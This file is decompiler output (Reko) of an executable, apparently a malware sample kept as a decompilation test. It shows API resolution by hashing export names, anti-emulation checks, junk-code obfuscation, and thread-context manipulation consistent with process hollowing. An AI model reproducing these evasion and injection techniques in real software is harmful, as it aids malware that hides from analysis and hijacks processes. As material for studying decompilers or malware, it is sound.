// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register word32 fn00401000()
word32 fn00401000()
{
	return 0x00;
}

// 0040100B: Register word32 fn0040100B(Stack Eq_5 dwArg04, Stack uint32 dwArg08)
word32 fn0040100B(HMODULE dwArg04, uint32 dwArg08)
{
	ptr32 v5_14 = fs->ptr0000;
	fs->ptr0000 = fp - 0x14;
	fn00401000();
	fn00401000();
	struct Eq_21 * eax_97 = dwArg04 + (&(dwArg04 + (&dwArg04->unused)[0x0F] / 0x04)->unused)[0x001E] / 0x04;
	word16 eax_101[] = dwArg04 + eax_97->dw0024 / 0x04;
	fn00401000();
	lstrcpyA(fp - 0x3C, &globals->t403010);
	lstrcpyA(fp - 0x3C, &globals->t40300E);
	if (SetFileSecurityA(null, 0x00, null) != 0x00)
		dwArg08 = dwArg08 + 211426;
	lstrcpyA(fp - 0x3C, &globals->t40300C);
	if (SetFileSecurityA((CHAR *) 0x0852, 0x00, null) == 0x00)
		dwArg08 = dwArg08 + 0x0003C707;
	word32 eax_191[] = dwArg04 + eax_97->dw0020 / 0x04;
	word32 eax_196[] = dwArg04 + eax_97->dw001C / 0x04;
	int32 edi_198 = 0x00;
	while (true)
	{
		word32 eax_251;
		if (edi_198 >= eax_97->dw0018)
			break;
		fn00401000();
		dwLoc48 = dwLoc48 & 0x00;
		Eq_115 (* eax_303)[] = dwArg04 + eax_191[edi_198] / 0x04;
		dwLoc50 = dwLoc50 & 0x00;
		while (Mem17[dwLoc50 + eax_303:byte] != 0x00)
		{
			fn00401000();
			dwLoc48 = (int32) Mem17[dwLoc50 + eax_303:byte] ^ 0x80 ^ (dwLoc48 << 0x07 | dwLoc48 >>u 0x19);
			dwLoc50 = dwLoc50 + 0x01;
		}
		if (dwLoc48 == dwArg08)
		{
			fn00401000();
			eax_251 = dwArg04 + eax_196[(word32) eax_101[edi_198]] / 0x04;
			goto l0040121B;
		}
		edi_198 = edi_198 + 0x01;
	}
	eax_251 = 0x00;
l0040121B:
	fs->ptr0000 = v5_14;
	return eax_251;
}

// 0040157B: void fn0040157B()
void fn0040157B()
{
	GetModuleHandleA(null);
	fn00401000();
	fn00401000();
	ptr32 esp_98;
	word32 ebp_99;
	word32 eax_100;
	word32 ebx_101;
	struct Eq_155 * esi_102;
	byte SCZO_103;
	word32 edx_104;
	globals->ptr4047E4();
	*(esp_98 - 0x04) = fp - 0x08;
	*(esp_98 - 0x08) = esi_102->dw0050;
	*(esp_98 - 0x0C) = ebx_101;
	*(esp_98 - 0x10) = eax_100;
	*(esp_98 - 0x14) = globals->dw4047D4;
	ptr32 esp_118;
	word32 ebp_119;
	word32 eax_120;
	word32 ebx_121;
	word32 esi_122;
	byte SCZO_123;
	word32 edx_124;
	globals->ptr4047E8();
	globals->dw4047EC = 0x00010007;
	*(esp_118 - 0x04) = 0x004047EC;
	*(esp_118 - 0x08) = globals->dw4047D8;
	ptr32 esp_131;
	word32 ebp_132;
	word32 eax_133;
	word32 ebx_134;
	word32 esi_135;
	byte SCZO_136;
	word32 edx_137;
	globals->ptr404AB8();
	*(esp_131 - 0x04) = 0x68;
	*(esp_131 - 0x08) = 0x68;
	*(esp_131 - 0x0C) = 0x68;
	*(esp_131 - 0x10) = 0x68;
	*(esp_131 - 0x14) = 0x68;
	*(esp_131 - 0x18) = 0x68;
	*(esp_131 - 0x1C) = 0x68;
	*(esp_131 - 0x20) = 0x68;
	*(esp_131 - 0x24) = 0x06;
	*(esp_131 - 0x28) = 0x08;
	*(esp_131 - 44) = 0x06;
	*(esp_131 - 0x30) = 0x08;
	*(esp_131 - 0x34) = 0x08;
	*(esp_131 - 0x38) = 0x06;
	fn00401000();
	globals->dw4048A4 = 0x0040122E;
	*(esp_131 - 0x04) = 0x68;
	*(esp_131 - 0x08) = 0x68;
	*(esp_131 - 0x0C) = 0x68;
	*(esp_131 - 0x10) = 0x68;
	*(esp_131 - 0x14) = 0x68;
	*(esp_131 - 0x18) = 0x68;
	*(esp_131 - 0x1C) = 0x68;
	*(esp_131 - 0x20) = 0x68;
	*(esp_131 - 0x24) = 0x06;
	*(esp_131 - 0x28) = 0x08;
	*(esp_131 - 44) = 0x06;
	*(esp_131 - 0x30) = 0x08;
	*(esp_131 - 0x34) = 0x08;
	*(esp_131 - 0x38) = 0x06;
	word32 eax_198 = fn00401000();
	*(esp_131 - 0x04) = 0x004047EC;
	*(esp_131 - 0x08) = globals->dw4047D8;
	ptr32 esp_205;
	word32 ebp_206;
	word32 eax_207;
	word32 ebx_208;
	word32 esi_209;
	byte SCZO_210;
	word32 edx_211;
	globals->ptr404ABC();
	*(esp_205 - 0x04) = globals->dw4047D8;
	word32 esp_215;
	word32 ebp_216;
	word32 eax_217;
	word32 ebx_218;
	word32 esi_219;
	byte SCZO_220;
	word32 edx_221;
	globals->ptr404AC0();
}

// 0040168C: Register Eq_441 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	Eq_5 eax_15 = LoadLibraryA(globals->t40405C);
	fn00401000();
	CloseHandle((void *) 0x09);
	globals->ptr404AC4 = fn0040100B(eax_15, ~0x20FC11F4);
	fn00401000();
	GetFileType((void *) 0x07);
	GetModuleHandleA(null);
	globals->ptr4047E4 = fn0040100B(eax_15, 59628650);
	globals->ptr4047E8 = fn0040100B(eax_15, 1729354233);
	fn00401000();
	globals->ptr404AB8 = fn0040100B(eax_15, 0x332E86E3);
	fn00401000();
	globals->ptr404ABC = fn0040100B(eax_15, 0x332EAEE3);
	fn00401000();
	globals->ptr404AC0 = fn0040100B(eax_15, 3938114547);
	fn00401000();
	globals->ptr404AC8 = fn0040100B(eax_15, 1169791454);
	fn00401000();
	globals->ptr404ACC = fn0040100B(eax_15, 78794705);
	globals->ptr4043D0 = fn0040100B(eax_15, 1503585518);
	GetModuleFileNameA(null, &globals->t404AD0, 0x0104);
	lstrcpyA(&globals->t404BD4, globals->t404028);
	lstrcatA(&globals->t404BD4, globals->t404054);
	lstrcatA(&globals->t404BD4, globals->t404010);
	lstrcatA(&globals->t404BD4, &globals->t404AD0);
	globals->dw404CD8 = 0x44;
	fn00401000();
	globals->dw404D04 = 0x01;
	fn00401000();
	globals->w404D08 = 0x02;
	word32 eax_429 = fn00401000();
	ptr32 esp_451;
	word32 ebp_452;
	byte SCZO_453;
	word32 ebx_454;
	word32 eax_455;
	byte SZO_456;
	bool C_457;
	globals->ptr404AC4();
	*(esp_451 - 0x04) = 0x68;
	*(esp_451 - 0x08) = 0x68;
	*(esp_451 - 0x0C) = 0x68;
	*(esp_451 - 0x10) = 0x68;
	*(esp_451 - 0x14) = 0x68;
	*(esp_451 - 0x18) = 0x68;
	*(esp_451 - 0x1C) = 0x68;
	*(esp_451 - 0x20) = 0x68;
	*(esp_451 - 0x24) = 0x06;
	*(esp_451 - 0x28) = 0x08;
	*(esp_451 - 44) = 0x06;
	*(esp_451 - 0x30) = 0x08;
	*(esp_451 - 0x34) = 0x08;
	*(esp_451 - 0x38) = 0x06;
	fn00401000();
	*(esp_451 - 0x04) = globals->dw40403C;
	*(esp_451 - 0x08) = fp - 0x24;
	lstrcpyA(*(esp_451 - 0x08), *(esp_451 - 0x04));
	*(esp_451 - 0x04) = globals->dw404030;
	*(esp_451 - 0x08) = fp - 0x24;
	lstrcatA(*(esp_451 - 0x08), *(esp_451 - 0x04));
	*(esp_451 - 0x04) = globals->dw404048;
	*(esp_451 - 0x08) = fp - 0x24;
	lstrcatA(*(esp_451 - 0x08), *(esp_451 - 0x04));
	*(esp_451 - 0x04) = globals->dw404034;
	*(esp_451 - 0x08) = fp - 0x24;
	lstrcatA(*(esp_451 - 0x08), *(esp_451 - 0x04));
	*(esp_451 - 0x04) = fp - 0x24;
	ptr32 esp_523;
	word32 ebp_524;
	byte SCZO_525;
	word32 ebx_526;
	word32 eax_527;
	byte SZO_528;
	bool C_529;
	globals->ptr4043D0();
	*(esp_523 - 0x04) = 3076484810;
	*(esp_523 - 0x08) = eax_527;
	globals->ptr404D1C = fn0040100B(dwArg00, dwArg04);
	*(esp_523 - 0x04) = ~0x6E94A6E0;
	*(esp_523 - 0x08) = eax_527;
	globals->ptr404D20 = fn0040100B(dwArg00, dwArg04);
	*(esp_523 - 0x04) = 558816170;
	*(esp_523 - 0x08) = eax_527;
	globals->ptr404D24 = fn0040100B(dwArg00, dwArg04);
	*(esp_523 - 0x04) = 2199015342;
	*(esp_523 - 0x08) = eax_527;
	globals->ptr404D28 = fn0040100B(dwArg00, dwArg04);
	*(esp_523 - 0x04) = 0x68;
	*(esp_523 - 0x08) = 0x68;
	*(esp_523 - 0x0C) = 0x68;
	*(esp_523 - 0x10) = 0x68;
	*(esp_523 - 0x14) = 0x68;
	*(esp_523 - 0x18) = 0x68;
	*(esp_523 - 0x1C) = 0x68;
	*(esp_523 - 0x20) = 0x68;
	*(esp_523 - 0x24) = 0x06;
	*(esp_523 - 0x28) = 0x08;
	*(esp_523 - 44) = 0x06;
	*(esp_523 - 0x30) = 0x08;
	*(esp_523 - 0x34) = 0x08;
	*(esp_523 - 0x38) = 0x06;
	fn00401000();
	*(esp_523 - 0x04) = ~0x5558621F;
	*(esp_523 - 0x08) = eax_527;
	globals->ptr404D2C = fn0040100B(dwArg00, dwArg04);
	*(esp_523 - 0x04) = 0x68;
	*(esp_523 - 0x08) = 0x68;
	*(esp_523 - 0x0C) = 0x68;
	*(esp_523 - 0x10) = 0x68;
	*(esp_523 - 0x14) = 0x68;
	*(esp_523 - 0x18) = 0x68;
	*(esp_523 - 0x1C) = 0x68;
	*(esp_523 - 0x20) = 0x68;
	*(esp_523 - 0x24) = 0x06;
	*(esp_523 - 0x28) = 0x08;
	*(esp_523 - 44) = 0x06;
	*(esp_523 - 0x30) = 0x08;
	*(esp_523 - 0x34) = 0x08;
	*(esp_523 - 0x38) = 0x06;
	word32 eax_626 = fn00401000();
	*(esp_523 - 0x04) = globals->dw404004;
	ptr32 esp_631;
	word32 ebp_632;
	byte SCZO_633;
	word32 ebx_634;
	word32 eax_635;
	byte SZO_636;
	bool C_637;
	globals->ptr4043D0();
	*(esp_631 - 0x04) = 0x68;
	*(esp_631 - 0x08) = 0x68;
	*(esp_631 - 0x0C) = 0x68;
	*(esp_631 - 0x10) = 0x68;
	*(esp_631 - 0x14) = 0x68;
	*(esp_631 - 0x18) = 0x68;
	*(esp_631 - 0x1C) = 0x68;
	*(esp_631 - 0x20) = 0x68;
	*(esp_631 - 0x24) = 0x06;
	*(esp_631 - 0x28) = 0x08;
	*(esp_631 - 44) = 0x06;
	*(esp_631 - 0x30) = 0x08;
	*(esp_631 - 0x34) = 0x08;
	*(esp_631 - 0x38) = 0x06;
	fn00401000();
	*(esp_631 - 0x04) = 3459886161;
	*(esp_631 - 0x08) = eax_635;
	globals->ptr404D30 = fn0040100B(dwArg00, dwArg04);
	*(esp_631 - 0x04) = 0x68;
	*(esp_631 - 0x08) = 0x68;
	*(esp_631 - 0x0C) = 0x68;
	*(esp_631 - 0x10) = 0x68;
	*(esp_631 - 0x14) = 0x68;
	*(esp_631 - 0x18) = 0x68;
	*(esp_631 - 0x1C) = 0x68;
	*(esp_631 - 0x20) = 0x68;
	*(esp_631 - 0x24) = 0x06;
	*(esp_631 - 0x28) = 0x08;
	*(esp_631 - 44) = 0x06;
	*(esp_631 - 0x30) = 0x08;
	*(esp_631 - 0x34) = 0x08;
	*(esp_631 - 0x38) = 0x06;
	fn00401000();
	fn0040157B();
	*(esp_631 - 0x04) = 0x68;
	*(esp_631 - 0x08) = 0x68;
	*(esp_631 - 0x0C) = 0x68;
	*(esp_631 - 0x10) = 0x68;
	*(esp_631 - 0x14) = 0x68;
	*(esp_631 - 0x18) = 0x68;
	*(esp_631 - 0x1C) = 0x68;
	*(esp_631 - 0x20) = 0x68;
	*(esp_631 - 0x24) = 0x06;
	*(esp_631 - 0x28) = 0x08;
	*(esp_631 - 44) = 0x06;
	*(esp_631 - 0x30) = 0x08;
	*(esp_631 - 0x34) = 0x08;
	*(esp_631 - 0x38) = 0x06;
	word32 eax_734 = fn00401000();
	*(esp_631 - 0x04) = 0x00;
	word32 esp_738;
	word32 ebp_739;
	byte SCZO_740;
	word32 ebx_741;
	word32 eax_742;
	byte SZO_743;
	bool C_744;
	globals->ptr404ACC();
	return 0x00;
}

